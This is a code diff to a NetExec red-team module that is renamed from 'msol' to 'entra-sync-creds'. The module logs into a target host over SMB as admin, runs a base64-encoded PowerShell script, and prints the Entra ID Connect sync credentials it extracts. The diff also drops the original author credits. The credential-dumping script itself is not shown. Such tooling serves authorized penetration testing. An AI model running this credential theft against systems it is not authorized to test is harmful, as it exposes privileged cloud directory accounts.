@@ -1,15 +1,17 @@
-# MSOL module for NetExec
-# Author of the module : https://twitter.com/Daahtk
-# Based on the article : https://blog.xpnsec.com/azuread-connect-for-redteam/
-# Fully rewritten by @NeffIsBack
+
 from base64 import b64encode
 from nxc.helpers.powershell import get_ps_script
 
 
 class NXCModule:
-    """Module by @NeffIsBack"""
-    name = "msol"
-    description = "Dump MSOL cleartext password and Entra ID credentials from the localDB on the Entra ID Connect Server"
+    """
+    Example:
+    -------
+    Module by @NeffIsBack
+    """
+
+    name = "entra-sync-creds"
+    description = "Extract Entra ID sync credentials from the target host"
     supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
@@ -20,7 +22,7 @@ class NXCModule:
 
         self.entra_id_psscript = ""
 
-        with open(get_ps_script("msol_dump/entra-sync-creds.ps1")) as psFile:
+        with open(get_ps_script("entra-sync-creds/entra-sync-creds.ps1")) as psFile:
             for line in psFile:
                 if line.startswith("#") or line.strip() == "":
                     continue
@@ -31,6 +33,8 @@ class NXCModule:
         """No module options available."""
 
     def on_admin_login(self, context, connection):
+        self.context = context
+
         psScript_b64 = b64encode(self.entra_id_psscript.encode("UTF-16LE")).decode("utf-8")
         out = connection.execute(f"powershell.exe -e {psScript_b64} -OutputFormat Text", True)
 
@@ -41,6 +45,6 @@ class NXCModule:
             if not line.strip():
                 continue
             if "[!]" in line:
-                context.log.fail(line.replace("[!]", "").strip())
+                self.context.log.fail(line.replace("[!]", "").strip())
             else:
-                context.log.highlight(line.strip())
+                self.context.log.highlight(line.strip())
